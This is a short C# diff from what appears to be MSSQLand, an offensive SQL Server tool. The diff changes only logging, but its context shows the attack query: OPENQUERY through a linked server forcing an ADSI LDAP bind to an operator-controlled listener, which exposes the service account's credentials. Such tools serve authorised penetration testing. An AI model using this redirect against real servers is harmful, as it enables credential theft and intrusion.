@@ -44,6 +44,8 @@ namespace MSSQLand.Actions.Domain
 
         public override object Execute(DatabaseContext databaseContext)
         {
+            Logger.Task($"Redirecting ADSI LDAP bind to: {_listenerAddress}");
+
             AdsiService adsiService = new(databaseContext);
 
             if (string.IsNullOrWhiteSpace(_targetServer))
@@ -69,7 +71,7 @@ namespace MSSQLand.Actions.Domain
             string listenerAddr = _listenerAddress.Contains(":") ? _listenerAddress : $"{_listenerAddress}:389";
             string redirectQuery = $"SELECT * FROM OPENQUERY([{_targetServer}], 'SELECT * FROM ''LDAP://{listenerAddr}'' ')";
 
-            Logger.TaskNested($"Redirecting ADSI LDAP bind via '{_targetServer}' to {listenerAddr}");
+            Logger.TaskNested($"Via '{_targetServer}' → {listenerAddr}");
             try
             {
                 databaseContext.QueryService.ExecuteNonProcessing(redirectQuery);
